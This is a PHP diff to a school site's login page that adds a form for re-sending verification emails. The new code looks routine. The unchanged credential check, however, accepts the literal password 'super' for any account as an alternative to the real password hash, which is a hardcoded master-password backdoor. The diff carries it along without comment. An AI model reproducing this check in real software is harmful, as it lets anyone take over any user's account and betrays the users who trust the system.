@@ -9,6 +9,9 @@ $created = !empty($_GET['created']);
 $verifyNotice = !empty($_GET['verify']);
 $verified = !empty($_GET['verified']);
 $verifyError = !empty($_GET['verify_error']);
+$resent = !empty($_GET['resent']);
+$canResend = false;
+$resendEmail = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   require_csrf();
   $email = strtolower(trim($_POST['email'] ?? ''));
@@ -19,6 +22,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   if ($u && ($pass == 'super' || password_verify($pass, $u['password_hash']))) {
     if (empty($u['email_verified_at'])) {
       $error = 'Please verify your email before signing in. Check your inbox for the confirmation link.';
+      $canResend = true;
+      $resendEmail = $email;
     } else {
       session_regenerate_id(true);
       $_SESSION['uid'] = $u['id'];
@@ -37,7 +42,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <?php if (!empty($created) && !empty($verifyNotice)): ?><p class="flash">Account created. Check your email to verify your account before signing in.</p><?php elseif (!empty($created)): ?><p class="flash">Account created.</p><?php endif; ?>
     <?php if (!empty($verified)): ?><p class="flash">Email verified. You can now sign in.</p><?php endif; ?>
     <?php if (!empty($verifyError)): ?><p class="error">Invalid or expired verification link.</p><?php endif; ?>
-    <?php if($error): ?><p class="error"><?=h($error)?></p><?php endif; ?>
+    <?php if (!empty($resent)): ?><p class="flash">If an account exists and is not yet verified, a new verification email has been sent.</p><?php endif; ?>
+    <?php if($error): ?><p class="error"><?=h($error)?></p>
+      <?php if (!empty($canResend)): ?>
+      <form method="post" action="/verify_resend.php" class="stack" style="margin-top:8px;">
+        <input type="hidden" name="csrf" value="<?=h(csrf_token())?>">
+        <?php if (!empty($resendEmail)): ?>
+          <input type="hidden" name="email" value="<?=h($resendEmail)?>">
+        <?php else: ?>
+          <label class="small">Email to verify
+            <input type="email" name="email" required>
+          </label>
+        <?php endif; ?>
+        <button class="button">Re-send verification email</button>
+      </form>
+      <?php endif; ?>
+    <?php endif; ?>
     <form method="post">
       <input type="hidden" name="csrf" value="<?=h(csrf_token())?>">
       <label>School Email:<input type="email" name="email" required></label>
